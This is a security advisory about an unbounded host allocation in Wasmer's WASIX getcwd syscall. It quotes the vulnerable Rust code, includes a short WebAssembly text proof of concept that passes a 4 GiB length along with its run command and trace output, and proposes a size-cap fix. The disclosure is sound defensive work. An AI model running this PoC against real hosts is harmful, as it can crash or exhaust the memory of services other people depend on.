description:
### Summary

`wasix_32v1::getcwd(path, path_len)` reads `max_path_len` from guest memory (via `path_len: WasmPtr<M::Offset, M>`) and then executes `vec![0; max_path_len64 as usize]` to stage the cwd before writing it to the guest's `path` buffer. There is no cap on `max_path_len64`. A guest passing `max_path_len = 0xFFFF_FFFF` and a non-null `path` pointer forces the host to allocate a ~4 GiB zero-initialized buffer for what is, in practice, a path that is almost always under `PATH_MAX` (4096 bytes).

This is a sibling of GHSA-p7h3-r7cm-8wrm (`random_get`) — same primitive (guest-supplied `u32` length flows directly into `vec![0; N]` on the host), different syscall.

### Vulnerable code

[`lib/wasix/src/syscalls/wasix/getcwd.rs:20-47`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/syscalls/wasix/getcwd.rs#L20-L47):

```rust
let max_path_len = wasi_try_mem!(path_len.read(&memory));
let max_path_len64: u64 = max_path_len.into();
let path_slice = match (path.is_null(), max_path_len64) {
    (true, _) => None,
    (_, 0) => None,
    (_, _) => Some(wasi_try_mem!(path.slice(&memory, max_path_len))),
};
// ...
if cur_dir.len() as u64 > max_path_len64 {
    return Errno::Range;
}

if let Some(path_slice) = path_slice {
    let cur_dir = {
        let mut u8_buffer = vec![0; max_path_len64 as usize];  // <-- unbounded
        let cur_dir_len = cur_dir.len();
        if (cur_dir_len as u64) <= max_path_len64 {
            u8_buffer[..cur_dir_len].clone_from_slice(cur_dir);
        } else {
            return Errno::Range;
        }
        u8_buffer
    };
    wasi_try_mem!(path_slice.write_slice(cur_dir.as_ref()));
    // ...
```

The guard `cur_dir.len() as u64 > max_path_len64` is the wrong direction — it triggers `Errno::Range` only when the cwd is *longer* than what the guest requested, never when the guest requested an absurdly large buffer. The `vec![0; max_path_len64 as usize]` on line 37 is then executed with no cap.

The handler is bound for the `wasix_32v1` namespace ([`lib/wasix/src/lib.rs:582`](https://github.com/wasmerio/wasmer/blob/b384fd8162e60a73a0e5bfa429e0cac610ffe5c9/lib/wasix/src/lib.rs#L582)) and `wasix_64v1` (`:729`). For Memory64 guests the cap is `u64::MAX`.

### Production reachability

The handler is exported from any WASIX-capable runner. The guest only needs to (a) supply a non-null `path` pointer and (b) write `0xFFFF_FFFF` to the location pointed at by `path_len` before the call. No filesystem access, capability negotiation, or socket is required.

### PoC

Minimal `.wat`:

```wasm
(module
  (import "wasix_32v1" "getcwd"
    (func $getcwd (param i32 i32) (result i32)))
  (memory (export "memory") 1)
  (data (i32.const 100) "\ff\ff\ff\ff")   ;; max_path_len = 0xFFFFFFFF
  (func (export "_start")
    i32.const 8       ;; path pointer = 8 (non-null)
    i32.const 100     ;; path_len pointer
    call $getcwd
    drop))
```

Driver: `wasmer run poc.wasm`.

Observed end-to-end on wasmer 7.1.0 (Homebrew bottle, macOS), `RUST_LOG=trace`:

```
WARN getcwd: wasmer::backend::sys::entities::memory:
    attempted to write (4294967295 bytes) beyond the bounds of the memory view
    (4294967303 > 65536)
    path="/" max_path_len=4294967295
TRACE getcwd: wasmer_wasix::syscalls::wasix::getcwd:
    return=Errno::memviolation path="/" max_path_len=4294967295
```

The trace confirms the handler executed past the `vec![0; max_path_len64]` allocation on line 37 (cwd was successfully copied into the first byte of the 4 GiB buffer) and then failed on the subsequent `path_slice.write_slice` attempting to write 4 GiB into the guest's 64 KiB linear memory.

Microbench mirroring the host allocation (`vec![0u8; 4 GiB]`):

```
vec![0u8; 4294967295] (4 GiB request)
vec! returned in 16.459µs, len=4294967295, cap=4294967295
first byte = 0, last byte = 0
```

On macOS the request returns instantly via lazy MAP_ANON; only the page containing `u8_buffer[..cur_dir_len]` commits, so committed RSS does not climb on this PoC. On strict-overcommit or 32-bit hosts the alloc fails and the wasmer process aborts.

### Impact

Denial-of-service against the wasmer host process. Any embedder using a WASIX-capable runner is exposed. On constrained hosts (containers, FaaS sandboxes, embedded systems) the allocation fails and the host aborts; on capable hosts the guest can repeatedly issue this call to inflate the host's virtual address space, exhaust `RLIMIT_AS`, or chew through a memory cgroup quota.

### Proposed fix

Add a configurable `max_getcwd_path_size: Option<u64>` on the WASI capability set, defaulting to a sane value (e.g. 16 MiB — well above any realistic path; or even 64 KiB to match POSIX `PATH_MAX` headroom). In `getcwd`:

```rust
if let Some(max) = env.capabilities.max_getcwd_path_size
    && max_path_len64 > max
{
    return Errno::Inval;
}
```

The check belongs immediately after `max_path_len64` is computed, before the `path.slice` call (so an oversized `max_path_len` never reaches `WasmSlice::new`).

### Cross-reference

Sibling of GHSA-p7h3-r7cm-8wrm (same primitive, different syscall).

### Credits

